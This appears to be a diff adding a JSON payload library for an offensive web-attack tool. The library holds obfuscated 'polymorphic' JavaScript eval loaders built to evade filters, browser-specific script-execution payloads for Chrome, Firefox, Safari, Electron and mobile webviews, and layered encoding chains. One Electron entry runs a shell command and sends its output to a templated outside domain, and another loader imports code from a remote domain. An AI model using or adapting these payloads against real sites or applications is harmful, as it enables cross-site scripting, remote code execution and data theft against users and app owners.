@@ -1,0 +1,170 @@
+{
+  "version": "3.5",
+  "author": "Dave Lester B. Mondina / ANBU Black Ops Security",
+  "polymorphic_payloads": [
+    {
+      "id": "poly_eval_b64",
+      "template": "eval(atob(\"{{b64}}\"))",
+      "encoder": "b64",
+      "notes": "Classic polymorphic eval loader"
+    },
+    {
+      "id": "poly_unescape",
+      "template": "eval(unescape(\"{{ue}}\"))",
+      "encoder": "unicode_escape",
+      "notes": "Random escaped unicode"
+    },
+    {
+      "id": "poly_string_split",
+      "template": "Function((\"{{chunked}}\".split('{{delim}}').join('')))()",
+      "encoder": "split_random",
+      "notes": "Random delimiter per request"
+    },
+    {
+      "id": "poly_charcode_spread",
+      "template": "(()=>{const x=[{{arr}}].map(c=>String.fromCharCode(c)).join('');Function(x)()})()",
+      "encoder": "array_charcodes",
+      "notes": "Array-of-charcodes mutation"
+    },
+    {
+      "id": "poly_dynamic_import",
+      "template": "import('//{{domain}}/m.js?t={{token}}').then(m=>m.default)",
+      "encoder": "none",
+      "notes": "Dynamic import polymorphic loader"
+    },
+    {
+      "id": "poly_comment_noise",
+      "template": "/*{{noise1}}*/Function(\"{{body}}\")()/*{{noise2}}*/",
+      "encoder": "noise",
+      "notes": "Random comment padding"
+    },
+    {
+      "id": "poly_hex_escape",
+      "template": "(()=>{const _='{{hex}}';Function(_)()})()",
+      "encoder": "hex_escape",
+      "notes": "Full hex mutation"
+    },
+    {
+      "id": "poly_constructor",
+      "template": "[].constructor.constructor('{{body}}')()",
+      "encoder": "plain",
+      "notes": "Array constructor trick"
+    },
+    {
+      "id": "poly_settimeout",
+      "template": "setTimeout(atob`{{b64}}`,0)",
+      "encoder": "b64",
+      "notes": "setTimeout with template literal"
+    },
+    {
+      "id": "poly_setinterval",
+      "template": "setInterval(Function(atob`{{b64}}`),9e9)",
+      "encoder": "b64",
+      "notes": "setInterval one-shot"
+    },
+    {
+      "id": "poly_fetch_blob",
+      "template": "fetch('data:text/javascript,{{ue}}').then(r=>r.text()).then(eval)",
+      "encoder": "url_encode",
+      "notes": "Fetch from data URL"
+    },
+    {
+      "id": "poly_new_function",
+      "template": "new(Function.bind.apply(Function,[null,'{{body}}']))()",
+      "encoder": "plain",
+      "notes": "Bound function apply"
+    },
+    {
+      "id": "poly_reflect",
+      "template": "Reflect.construct(Function,['{{body}}'])()",
+      "encoder": "plain",
+      "notes": "Reflect.construct method"
+    },
+    {
+      "id": "poly_proxy",
+      "template": "new Proxy({},{get:(_,k)=>k=='x'?Function('{{body}}')():0}).x",
+      "encoder": "plain",
+      "notes": "Proxy trap execution"
+    },
+    {
+      "id": "poly_with_statement",
+      "template": "with({a:Function})a('{{body}}')()",
+      "encoder": "plain",
+      "notes": "with statement scope"
+    }
+  ],
+  "browser_specific": {
+    "chrome": [
+      {
+        "id": "chrome_pdf_embed",
+        "payload": "<embed src=data:application/pdf;base64,{{b64pdf}}>",
+        "notes": "Chrome PDF plugin"
+      },
+      {
+        "id": "chrome_blob_worker",
+        "payload": "new Worker(URL.createObjectURL(new Blob(['{{body}}'])))",
+        "notes": "Blob worker execution"
+      }
+    ],
+    "firefox": [
+      {
+        "id": "firefox_svg_foreign",
+        "payload": "<svg><foreignObject><body onload={{body}}></foreignObject></svg>",
+        "notes": "Firefox SVG foreignObject"
+      },
+      {
+        "id": "firefox_xslt",
+        "payload": "new XSLTProcessor().importStylesheet(new DOMParser().parseFromString('{{xslt}}','text/xml'))",
+        "notes": "XSLT execution"
+      }
+    ],
+    "safari": [
+      {
+        "id": "safari_websql",
+        "payload": "openDatabase('x','1','x',1).transaction(t=>t.executeSql('SELECT 1',[],(t,r)=>{{body}}))",
+        "notes": "Safari WebSQL"
+      },
+      {
+        "id": "safari_unicode",
+        "payload": "{{unicode_body}}",
+        "notes": "Safari unicode normalization"
+      }
+    ],
+    "electron": [
+      {
+        "id": "electron_require",
+        "payload": "require('child_process').exec('{{cmd}}',(e,o)=>fetch('//{{domain}}/c?o='+btoa(o)))",
+        "notes": "Electron nodeIntegration RCE"
+      },
+      {
+        "id": "electron_remote",
+        "payload": "require('electron').remote.shell.openExternal('{{url}}')",
+        "notes": "Electron remote module"
+      }
+    ],
+    "webview_ios": [
+      {
+        "id": "wkwebview_bridge",
+        "payload": "webkit.messageHandlers.{{handler}}.postMessage({{data}})",
+        "notes": "iOS WKWebView bridge"
+      }
+    ],
+    "webview_android": [
+      {
+        "id": "android_interface",
+        "payload": "{{interface}}.{{method}}({{args}})",
+        "notes": "Android addJavascriptInterface"
+      }
+    ]
+  },
+  "encoding_chains": [
+    ["b64"],
+    ["hex_escape"],
+    ["unicode_escape"],
+    ["b64", "hex_escape"],
+    ["unicode_escape", "b64"],
+    ["split_random", "b64"],
+    ["array_charcodes"],
+    ["b64", "unicode_escape", "split_random"]
+  ]
+}
